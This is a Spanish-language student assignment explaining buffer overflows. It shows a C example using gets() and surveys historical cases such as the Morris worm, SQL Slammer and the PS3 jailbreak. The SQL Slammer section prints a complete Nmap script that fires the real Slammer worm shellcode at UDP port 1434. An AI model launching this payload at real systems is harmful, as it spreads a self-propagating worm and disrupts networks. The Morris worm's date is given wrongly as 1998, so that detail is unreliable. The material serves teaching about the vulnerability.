# Buffer Overflow
### IS727272 - Cordero Hernández, Marco Ricardo

_Mejor visto en [GitHub](https://github.com/Marcox385/DSS_O2023/blob/main/Tareas/IS727272%20-%20Buffer%20Overflow.md)_

## Introducción
Dentro del ámbito del desarrollo del software, una gran variedad de vulnerabilidades con múltiples niveles de severidad se dan en el día a día. La buena noticia es que la existencia de comunidades y entidades como [CWE][1], [CERT][2], [NIST][3], y más popularmente, [OWASP][4], proporcionan metodologías para el desarrollo seguro y la concientización de las potenciales amenazas y sus consecuencias al no asegurar su uso. La mala es que aún con tantos recursos disponibles, las fallas continuan emergiendo constantemente, y por ende, las repercusiones en ambientes productivos reales. Entre las miles de posibles vulnerabilidades, existe una que destaca por su carácter silencioso pero potencialmente catastrófico: _buffer overflow_.

## Concepto
OWASP [define][5] a esta vulnerabilidad como una condición que se da cuando un programa intenta almacenar datos de cierto tamaño que rebasa la capacidad de un _buffer_ (región de memoria para guardar información de manera temporal), o cuando se intenta acceder a un área de memoria ajena al mismo buffer. Esta acción puede resultar en la corrupción de información dentro y fuera del mismo programa en donde se de, terminar su ejecución, o incluso _ejecutar código malicioso_.  

Un ejemplo básico de este error es el siguiente:
```c
#include <stdio.h>

int main() {
    char buf[8]; // Buffer para una cadena de 8 caracteres
    gets(buf);  // Leer caracteres desde entrada estándar
    printf("%s\n", buf); // Imprimir cadena

    return 0; // Terminar programa con código de ejecución normal
}
```
Este código contiene una función inherentemente peligrosa: _gets_. Como se puede intuir, un potencial error en tiempo de ejecución será encontrado al momento de ingresar una cadena de más de 8 caracteres, ya que, adicional al uso de la función mencionada, no existe ningún otro tipo de comprobación. Lo mencionado terminará en un infame...
```bash
Segmentation fault (core dumped)
```  

Adicional a esto, CWE define _al menos_ dos tipos de buffer overflow:
- [Stack-based Buffer Overflow][6]: Comúnmente referido como **Stack Overflow** (:wink:), esta categoría de la vulnerabilidad hace referencia al uso del [stack del programa][7] para almacenar los datos, de esta forma, cuando los datos exceden la capacidad de un buffer determinado, el programa es propenso a corromperse, dando paso a la probabilidad de otorgar el control de la ejecución del programa a un usuario o atacante. También es posible encontrar un fallo cuando se hace uso de llamadas recursivas a funciones sin condición de salida, agotando la memoria reservada para el programa y eventualmente terminando en un error.
- [Heap-based Buffer Overflow][8]: Esta categoría es la definida al inicio de esta sección, de forma que al hacer uso de funciones de reserva de memoria como `malloc` es posible que se exceda dicha reserva, terminando en comportamientos del programa inesperados o su fallo completo.

## Ejemplos en entornos reales
1. [El gusano Morris (the Morris worm)][9] - Stack Overflow  
En noviembre de 1998, Robert Tappan Morris, egresado de la universidad de Cornell, lanzó un ataque desde una computadora del MIT sobre la ARPANet (la precursorsa del internet moderno); esto para hacer creer que la segunda institución era la culpable. El ataque consistía en la replica sin intervención humana (de ahí lo de _gusano_) de un demonio en sistemas operativos basados en Unix, específicamente, el demonio `fingerd`, el cual retornaría un reporte amigable para el usuario acerca del estado de la máquina o de otro usuario determinado.  
Por sí solo, el demonio no supone una amenaza substancial, sin embargo, cuando la autoreplica es introducida en un equipo de cómputo... tampoco representa una amenaza grave, pero, los recursos del huésped podrían ser drenados rápidamente, lo cual a su vez haría difícil la remoción del gusano, ya que también contaba con gran capacidad para ser distribuido a través de una red.  
Si bien el autor original indica que la creación de este ataque no tuvo otra intención más que la de un ejercicio didáctico, el caso llevó a la creación de una ya conocida entidad por parte de la agencia de proyectos de investigación de defensa avanzada (DARPA): el equipo de respuesta a emergencia computacionales, mejor conocida como _CERT_.

2. [SQL Slammer/Sapphire][10] - Stack Overflow  
Este ataque, también considerado como gusano, funciona mandando paquetes de red a alta velocidad, generando daños al tráfico de la misma red donde se corre (incluso haciendo inútil el propósito original de un gusano). Se dice que existe la posibilidad de que el lanzamiento de este ataque fuera accidental, y que su propósito original era el de la implementación de un algoritmo de propagación aleatoria sobre redes privadas, que de alguna forma encontró la manera de propagarse a través de la internet pública. ¿El recuento de daños? al rededor de 75 mil servidores a nivel global se vieron afectados al punto de colapsar las redes sobre las cuales operaban, resultando en pérdidas de sistemas críticos como puntos de venta y cajeros automáticos.  
Aunque _SQL_ está presente en el nombre de este caso, su implementación no involucra el uso de este lenguaje, más bien hace referencia a sistemas que ejecutaran el servidor de SQL de Microsoft.  
En una implementación moderna a través de Nmap, el código se vería [así][11]:
```nse
local nmap = require "nmap"                                     
local shortport = require "shortport"                           
local bin = require "bin"                                      

portrule = shortport.port_or_service(1434, "ms-sql-m", "udp")   

action = function(host, port)                                   
  local slammer = "04010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101dcc9b042eb0e0101010101010170ae420170ae42909090909090909068dcc9b042b80101010131c9b11850e2fd35010101055089e551682e646c6c68656c3332686b65726e51686f756e746869636b43684765745466b96c6c516833322e64687773325f66b965745168736f636b66b9746f516873656e64be1810ae428d45d450ff16508d45e0508d45f050ff1650be1010ae428b1e8b033d558bec517405be1c10ae42ff16ffd031c951515081f10301049b81f101010101518d45cc508b45c050ff166a116a026a02ffd0508d45c4508b45c050ff1689c609db81f33c61d9ff8b45b48d0c408d1488c1e20401c2c1e20829c28d049001d88945b46a108d45b05031c9516681f17801518d4503508b45ac50ffd6ebca"
  local s = nmap.new_socket("udp")                              
  local status, err = s:sendto(host, port, bin.pack("H", slammer))
  if status then
    return "SQL Slammer Worm sent"                              
  else
    return err                                                  
  end                                                           
end
```

3. [La guerra de los chats (Chat Wars)][12] - Heap Oveflow  
En un giro más satírico, poco antes del nuevo milenio, David Auerbach, un ex-ingeniero en Microsoft, estaba tratando de integrar el servicio de mensajería de Microsoft con el mensajero instantáneo de AOL (:older_man:). AOL no tomó esto de buena manera y lanzó un parche hacía sus servidores para impedir las conexiones de Microsoft entrantes, a lo cual respondieron de vuelta con la imitación del nuevo esquema de los mensajes para dificultar el proceso de distinción entre mensajes de AOL y mensajes de Microsoft.  
La "guerra" continuó con nuevas implementaciones subsecuentes, hasta que AOL decidió aprovechar un buffer overflow en sus propios servidores para verificar si un mensaje entrante había sido enviado desde un mismo cliente de AOL. Como Microsoft no implementaba la misma vulnerabilidad, la guerra de los chats terminó con AOL como la empresa ganadora.

4. [Vulnerabilidad de día zero en Skype][13] - Stack Overflow  
En vulnerabilidades más reciente, en el 2017, el servicio de comunicación Skype fue vulnerado por Benjamin Kunz-Mejri, quien descubrió una falla dentro del software relacionada con el uso del portapapeles y librería dinámicas de Windows.  
La vulnerabilidad ya es compleja por si sola, pero en términos simples, un atacante realiza una conexión remota hacía el equipo de una víctima y haciendo uso del portapapeles en ambos lados (cliente y servidor), una imagen puede ser pegada múltiples veces dentro de una conversación de Skype, lo cual resultará en un buffer overflow, el cual como mínimo detendrá la ejecución del programa, y también dará la posibilidad al atacante de ejecutar código malicioso del lado de la víctima. Evidentemente, la falla fue resuleta casi de inmediato.

5. [PS3 Jailbreak][14] - Heap Overflow  
Finalmente, se verá un poco de una de las industrias con mayor versatilidad en cuanto a descubrimiento de acciones indebidas se refiere: los videojuegos.  
Al rededor del 2010, cuatro años después del lanzamiento original de la PlayStation 3, un dispositivo con el nombre de "PSJailbreak" fue lanzado de manera no oficial, en donde una USB aparentemente común a simple vista podía hacer respaldos de juegos de la consola e incluso jugarlos desde el mismo dispositivo.  
Inicialmente, se creía que este tipo de exploit era del tipo Stack (buffer) Overflow, sin embargo, después de análisis detallado se llegó a la conclusión de que en realidad se trataba de un Heap (buffer) Overflow, puesto que funciona a través de la inserción y remoción de 5 falsos dispositivos USB virtuales, cada uno con descriptores de amplio tamaño; después de una serie de complejos procesos a bajo nivel, el cuarto dispositivo reporta un tamaño erróneo, dando acceso a regiones de memoria de la consola que (evidentemente) no deberían ser accedidas.  
Como caso adicional para análisis posteriores acerca de mal diseño de software, vale la pena revisar el caso de [_ninjhax_][15], en donde un juego pobremente programado para la consola 3DS fue el punto de entrada para la introducción de firmware modificado en toda la gama de consolas del mismo tipo.

# Referencias
[Common Weakness Enumeration. CWE.][1]  
[SEI CERT Coding Standards. CERT.][2]  
[Cybersecurity Framework. NIST.][3]  
[OWASP Foundation. OWASP.][4]  
[Buffer Overflow. OWASP.][5]  
[Stack-based Buffer Overflow. CWE.][6]  
[The Program Stack. c-jump.][7]  
[Heap-based Buffer Overflow. CWE.][8]  
[The Morris Worm. Limn.][9]  
[Remembering SQL Slammer. Netscout.][10]  
[Nmap script launcher for SQL Slammer worm. Daniel Miller][11]  
[Chat Wars. n+1][12]  
[Stack Buffer Overflow Zero Day Vulnerability uncovered in Microsoft Skype v7.2, v7.35 & v7.36. Vulnerability Magazine.][13]  
[PSJailbreak Exploit Payload Reverse Engineering. PS3 Developer Wiki.][14]
[Ninjhax. GBAtemp.][15]

[1]:https://cwe.mitre.org/index.html
[2]:https://wiki.sei.cmu.edu/confluence/display/seccode/SEI+CERT+Coding+Standards
[3]:https://www.nist.gov/cyberframework
[4]:https://owasp.org/about/
[5]:https://owasp.org/www-community/vulnerabilities/Buffer_Overflow
[6]:https://cwe.mitre.org/data/definitions/121.html
[7]:http://www.c-jump.com/CIS77/ASM/Stack/lecture.html
[8]:https://cwe.mitre.org/data/definitions/122.html
[9]:https://limn.it/articles/the-morris-worm/
[10]:https://www.netscout.com/blog/asert/remembering-sql-slammer
[11]:https://gist.github.com/bonsaiviking/3124893
[12]:https://www.nplusonemag.com/issue-19/essays/chat-wars/
[13]:https://www.vulnerability-db.com/?q=articles/2017/05/28/stack-buffer-overflow-zero-day-vulnerability-uncovered-microsoft-skype-v72-v735
[14]:https://www.psdevwiki.com/ps3/PSJailbreak_Exploit_Payload_Reverse_Engineering
[15]:https://wiki.gbatemp.net/wiki/Ninjhax
